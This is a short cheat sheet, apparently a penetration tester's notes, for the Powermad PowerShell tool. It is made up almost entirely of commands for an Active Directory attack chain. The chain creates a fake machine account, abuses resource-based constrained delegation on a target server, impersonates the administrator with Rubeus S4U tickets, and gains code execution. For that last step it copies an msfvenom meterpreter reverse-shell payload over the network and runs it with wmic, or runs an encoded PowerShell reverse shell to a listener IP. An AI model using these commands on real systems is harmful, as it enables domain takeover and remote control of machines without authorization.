# Name
Powermad

## Usage
```
# Create a fake computer account
. .\powermad.ps1
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
Get-DomainComputer -Identity myComputer

# Get the SID of myComputer$
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid

# Create a Security Descriptor for RBCD
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"

# Convert and Apply the Security Descriptor to appsrv01
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Verify That RBCD Was Configured
$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl

# Verify the SID Mapping
ConvertFrom-SID S-1-5-21-634106289-3621871093-708134407-3601

# Generate an NTLM Hash for myComputer$
.\Rubeus.exe hash /password:h4x

# Request a Ticket Granting Service (TGS) Ticket Using Rubeus
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt

# Verify Remote Access to appsrv01
dir \\appsrv01.prod.corp1.com\c$

# Obtaining code execution
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=80 EXITFUNC=thread -f exe -o shell.exe
copy shell.exe \\appsrv01.prod.corp1.com\C$\Windows\Temp\shell.exe
wmic /node:appsrv01.prod.corp1.com process call create "C:\Windows\Temp\shell.exe"

#OR 

python3 mkpsrevshell.py 192.168.45.222 443
wmic /node:appsrv01.prod.corp1.com process call create "powershell -e JABjAG.."
```

## Source
https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1
